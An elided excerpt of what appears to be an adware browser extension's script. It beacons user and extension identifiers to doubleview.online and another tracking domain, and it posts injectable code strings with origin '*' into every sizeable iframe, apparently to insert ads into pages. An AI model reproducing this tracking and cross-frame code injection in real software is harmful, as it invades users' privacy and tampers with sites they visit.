...
if (!window.zMainObj.adRequests) {
	...
	window.zMainObj.adRequests = {
		...
		altStat: function (action, blockName, network, count = 1) {
			new Image().src =
				'https://doubleview.online/gant/pcedhgghoalplpjcnmngmeajomcpbjif_lfjxti0lasuhm57fhwk/pcedhgghoalplpjcnmngmeajomcpbjif/' +
				action +
				'/' +
				blockName +
				'/' +
		...
		stat: function (action, blockName, network, count = 1) {
			...
			let statUrl =
				`https://${statDom}/s/c?a=${action}&u=lfjxti0lasuhm57fhwk&e=pcedhgghoalplpjcnmngmeajomcpbjif&b=west_${blockName}&n=${network}_west&r=` +
				Math.random();
			...
			if (data.go_found && data.frame_id === frame.id) {
				if (frame.contentWindow) {
					frame.contentWindow.postMessage(
						{
							'boosterWorker': 1,
							'booster': `(()=>{${window.zMainObj.adRequests.prepareGoogleAds.toString()};prepareGoogleAds('${
								frame.id
			...
			try {
				document.querySelectorAll('iframe').forEach((iframe) => {
					if (iframe.clientHeight > 20) {
						sendToFrame(iframe, id, minifiedStyles, adCount, debug);
						setTimeout(function () {
							sendToFrame(iframe, id, minifiedStyles, adCount, debug);
						}, 100);
				...
				function sendToFrame(iframe, frameID, styles, adCount, debug) {
					...
					if (iframe.contentWindow) {
						iframe.contentWindow.postMessage(
							{
								'boosterWorker': 1,
								'booster': `(()=>{${subFrameCode.toString()};subFrameCode('${frameID}', "${styles}", '${adCount}', ${debug})})()`
							},
							'*'
						);
					}
				...
				function subFrameCode(frameId, styles, adCount, debug) {
...
if(!window.zMainObj.storage && window.self === window.top)
{
	window.zMainObj.storage = {
		'extRequest' : function(params,callback)
		{
			...
			window.postMessage({'sBoost':1,'additionalOptions':params,'handler':handler},'*');
		},
